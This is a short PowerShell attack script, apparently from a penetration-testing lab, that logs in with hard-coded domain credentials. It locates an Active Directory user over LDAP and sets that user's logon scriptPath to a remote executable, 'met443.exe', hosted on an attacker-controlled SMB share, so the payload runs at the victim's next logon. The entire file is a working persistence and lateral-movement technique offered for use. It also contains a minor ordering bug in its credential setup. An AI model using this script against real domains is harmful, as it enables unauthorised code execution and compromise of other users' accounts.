#make sure the login user allow to modified other user login path before run this script
$targetUsername = "alfred"
$scriptPathValue = "\\192.168.45.220\share\met443.exe"

$cred = New-Object System.Management.Automation.PSCredential("gotham\bruce", $secPass)
$secPass = ConvertTo-SecureString "Password1" -AsPlainText -Force

# Run in alternate credentials context
Start-Job -Credential $cred -ScriptBlock {
    param($userToModify, $scriptPath)

    try {
        $searcher = New-Object DirectoryServices.DirectorySearcher
        $searcher.Filter = "(&(objectClass=user)(sAMAccountName=$userToModify))"
        $searcher.PropertiesToLoad.Add("distinguishedName") | Out-Null

        $result = $searcher.FindOne()
        if (-not $result) {
            Write-Output "[X] Could not find user '$userToModify'"
            return
        }

        $dn = $result.Properties["distinguishedName"][0]
        $user = New-Object DirectoryServices.DirectoryEntry("LDAP://$dn")

        # Set scriptPath
        $user.Properties["scriptPath"].Value = $scriptPath
        $user.CommitChanges()

        Write-Output "[+] scriptPath set successfully on $userToModify"
    } catch {
        Write-Output "[X] Error: $($_.Exception.Message)"
    }
} -ArgumentList $targetUsername, $scriptPathValue | Wait-Job | Receive-Job
